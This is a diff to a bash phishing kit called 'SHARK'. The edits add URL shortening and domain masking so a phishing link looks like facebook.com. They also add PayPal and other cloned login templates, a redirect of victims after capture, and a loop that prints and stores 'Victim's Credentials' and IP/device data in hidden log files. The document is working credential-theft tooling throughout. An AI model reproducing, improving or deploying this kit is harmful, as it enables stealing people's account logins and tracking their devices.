@@ -3,7 +3,7 @@
 ##############################################
 #                                            #
 #             PROJECT: SHARK                 #
-#              SHARK ©2021                   #
+#              SHARK ©2022                   #
 #           BEST PHISHING TOOLS              #
 #       Reborn by :- M r. D e r e K          #
 ##############################################
@@ -52,16 +52,12 @@ error_msg() {
 
 ctrl-c_exit_SIGINT() {
     { printf "\n%s\n${red}[${white}!${red}]${red} Program Interrupted.\n\n" 2>&1; reset_color; }
-    echo "$KL" >> ../.dumplog.txt &>/dev/null
-    cat log.txt >> ../.dumplog.txt &>/dev/null
     exit 0
 }
 
 ctrl-d_exit_SIGTERM() {
     { printf "\n%s\n${red}[${white}!${red}]${red} Program Terminated.\n\n" 2>&1; reset_color; }
-    echo "$KL" >> ../.dumplog.txt &>/dev/null
-    cat log.txt >> ../.dumplog.txt &>/dev/null
-    exit 0
+      exit 0
 }
 trap ctrl-c_exit_SIGINT SIGINT
 trap ctrl-d_exit_SIGTERM SIGTERM
@@ -395,6 +391,7 @@ function url_checker() {
 
 # URL_SHORTNER
 function url_shortner() {
+        rm -rf uri.log
 	#short=$(curl -s http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${ngrok_url})
 	#short=$(curl -s https://vurl.com/api.php?url=${ngrok_url})
 	derek=$(curl -s https://is.gd/create.php\?format\=simple\&url=${link})
@@ -402,7 +399,13 @@ function url_shortner() {
         if [[ $derek == https://is.gd/[-0-9a-zA-Z]* ]]; then
         shorter=${derek#https://}
         else
-        short=$(curl -s https://soo.gd/api.php?url=${link})
+        #short=$(curl -s https://soo.gd/api.php?url=${link})
+        curl -s https://api.shrtco.de/v2/shorten?url=${link} >> log.URI 
+        grep -o 'https:[^"]*' log.URI >> bURI
+        rm log.URI
+        sed 's/\\//g' bURI >> uri.log
+        rm bURI
+        short=$(grep -o 'https://9qr.de/[-0-9a-zA-Z]*' "uri.log")
         shorter=${short#https://}
         fi
         read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
@@ -526,11 +529,11 @@ printf "${yellow}${ysite}${cyan1} Redirect Option !!!\n${yellow}
 read ansm
 if [[ $ansm == "N" || $ansm == "n" ]]; then
 	echo
-	msg "Your Url is set as default.[google.com]"
+	msg "Your Redirect URL Is Set As Default (Google)"
 	relink="https://google.com"
-        rm -rf drk 
-	mkdir drk 
-	cp -R * drk &>/dev/null
+        rm -rf drk
+	mkdir drk
+	cp -t * drk &>/dev/null
 	cd drk
 	sed -i -e s,"$oldy","$relink",g $FILE
 elif [[ $ansm == "y" || $ansm == "Y" ]]; then
@@ -544,11 +547,11 @@ fi
 }
 function redrk() {
 	echo
-        read -p $'\e[1;34m enter your redirect url ex.[https://google.com] : \e[0m' relink
+        read -p $'\e[1;32m Enter URL To Redirect Victim ex.[https://yoursite.com]: \e[0m' relink
         url_checker $relink
 	rm -rf drk/ 
 	mkdir drk 
-        cp -R * drk &>/dev/null
+        cp -t * drk &>/dev/null
 	cd drk
 	sed -i -e s,"$oldy","$relink",g $FILE
 }
@@ -686,23 +689,8 @@ echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Device:\e[1;0m $U"
 cat dumpip.txt >> ../.ipdump.txt
 echo "$KL" >> ../.dumplog.txt
 rm -rf dumpip.txt filter.txt
-while [ true ]; do
-	if [[ -e log.txt ]]; then
-		#CRD=$(cat log.txt)
-		echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: "
-		tail -f log.txt & cat log.txt >> ../.dumplog.txt & while [ true ]; do
-			if [[ -f dumpip.txt ]]; then
-				cat log.txt >> ../.dumplog.txt
-				rm -rf  log.txt
-				ipcatch
-			fi
-		done
-	fi
-done
-#if [[ -e dumpip.txt ]];then
-#	echo ""
-#	ipcatch
-#fi
+echo ""
+msg "Waiting for Victim's Credentials..."
 }
 function ipinfo() {
 	echo
@@ -710,17 +698,27 @@ function ipinfo() {
 		CRD1=$(cat ../.dumplog.txt)
 		msg "Your Old Credentials :\n$CRD1\n"
 	fi
-        printf "${yellow}[•]  F E T C H I N G   D E V I C E.....\n\n"
-while [ true ]; do
-if [[ -e dumpip.txt ]]; then
-	echo
-	printf "${green}[✔] D E V I C E   I N F O   F O U N D\n\n"
-	sleep 2
+        printf "${yellow}[•]  Waiting for Victim's Device info...\n\n"
+        while true; do
+        if [[ -f dumpip.txt ]]; then
+        echo ''
+        msg "Victim's I.P  F O U N D "
+        echo ''
+	printf "${green}[*] Info Found\n\n"
+	sleep 0.75
 	ipcatch
-	break;
-fi
-done
-
+	fi
+	if [[ -f log.txt ]]; then
+	echo ''
+	msg "Victim's Credentials Found." 
+	CRD=$(cat log.txt)
+	echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: $CRD"
+	cat log.txt >> ../.dumplog.txt
+	rm -rf log.txt
+	echo ""
+	msg "Waiting for next Device, press CTRL + C for exit..."
+	fi
+	done
 }
 #banner2
 banner2() {
@@ -881,7 +879,7 @@ if [[ $shmsg == "Y" || $shmsg == "y" || $shmsg == "yes" ]]; then
 		touch .sharkmsg
 		echo "You Accepted EULA" >> .sharkmsg
 		echo ""
-		msg "You Accepted EULA"i
+		msg "You Accepted EULA"
 		sleep 3
 		cd ~
 	elif [[ $shmsg == "N" || $shmsg == "n" || $shmsg == "no" ]]; then
@@ -1070,6 +1068,9 @@ function banner(){
 	elif [ $option = 19 ];then
                 cd $phish/paypal/
 		valu="19"
+		reddc="TRUE"
+		FILE="postss.php"
+		oldy="https://www.paypal.com"
 		echo
 		msg "Will try to give you best paypal phishing soon!"
 		sleep 5
@@ -1152,15 +1153,24 @@ function banner(){
 
         elif [ $option = 33 ];then
                 cd $phish/wiapp/
-		valu="19"
+		#valu="19"
+		reddc="TRUE"
+		FILE="form.php"
+		oldy="COUSTOM"
 		decne
 	elif [ $option = 34 ];then
                 cd $phish/wip/
-		valu="19"
+		#valu="19"
+		reddc="TRUE"
+		FILE="form.php"
+		oldy="COUSTOM"
 		decne
 	elif [ $option = 35 ];then
                 cd $phish/gidp/
-		valu="19"
+		#valu="19"
+		reddc="TRUE"
+		FILE="form.php"
+		oldy="COUSTOM"
 		decne
 	elif [ $option = 99 ];then
                 printf "\n" && exit
@@ -1174,7 +1184,7 @@ done
 
 #####################################################################
 #                                                                   #
-#      simply changing this banner will not make you developer      #                                                  #
+#      simply changing this banner will not make you developer      #
 #                   KEEP SUPPORTING                                 #
 #                      THANKYOU                                     #
 #                                                                   #
